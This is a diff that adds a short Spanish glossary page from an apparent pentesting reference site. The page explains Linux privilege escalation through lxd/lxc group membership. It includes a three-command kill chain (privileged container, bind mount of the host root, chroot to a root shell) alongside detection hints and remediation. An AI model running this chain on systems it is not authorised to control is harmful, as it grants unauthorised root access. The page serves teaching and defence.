@@ -1,0 +1,37 @@
+---
+title: "lxd / lxc group membership"
+description: "Usuario en grupo lxd o lxc puede crear/iniciar containers privilegiados sin sudo."
+---
+
+# lxd / lxc group membership
+
+<p className="glossary-answer">Usuario en grupo lxd o lxc puede crear/iniciar containers privilegiados sin sudo.</p>
+
+**Categoría:** [Linux · Privilege Escalation](/glosario)
+
+🎯 **Trinchera** — Usuario en grupo `lxd` o `lxc` puede crear/iniciar
+containers privilegiados sin sudo. Container con bind mount de `/`
+del host = root.
+
+🔗 **Kill chain** — `lxc init alpine evil -c security.privileged=true`
+→ `lxc config device add evil host disk source=/ path=/mnt/host` →
+`lxc start evil; lxc exec evil -- chroot /mnt/host /bin/bash`.
+
+📡 **Huella defensiva** — Creación de containers privilegiados,
+binds de `/` del host.
+
+⚠️ **Falso amigo** — Mismo patrón que docker socket. Cualquier
+grupo "container manager" sin restricción = root path.
+
+🛡️ **Remediación** — Auditar membresía de `lxd`/`lxc`/`docker`/`podman`
+groups; usar tools rootless (Podman default).
+
+---
+
+← [Volver al glosario completo](/glosario)
+
+<script type="application/ld+json">{`{"@context":"https://schema.org","@type":"DefinedTerm","name":"lxd / lxc group membership","description":"Usuario en grupo lxd o lxc puede crear/iniciar containers privilegiados sin sudo.","inDefinedTermSet":{"@type":"DefinedTermSet","name":"Glosario táctico de pentesting","url":"https://rootea.es/glosario"},"url":"https://rootea.es/glosario/lxd-lxc-group-membership"}`}</script>
+
+<script type="application/ld+json">{`{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Inicio","item":"https://rootea.es"},{"@type":"ListItem","position":2,"name":"Glosario táctico","item":"https://rootea.es/glosario"},{"@type":"ListItem","position":3,"name":"lxd / lxc group membership","item":"https://rootea.es/glosario/lxd-lxc-group-membership"}]}`}</script>
+
+_Última actualización: 2026-06-11_
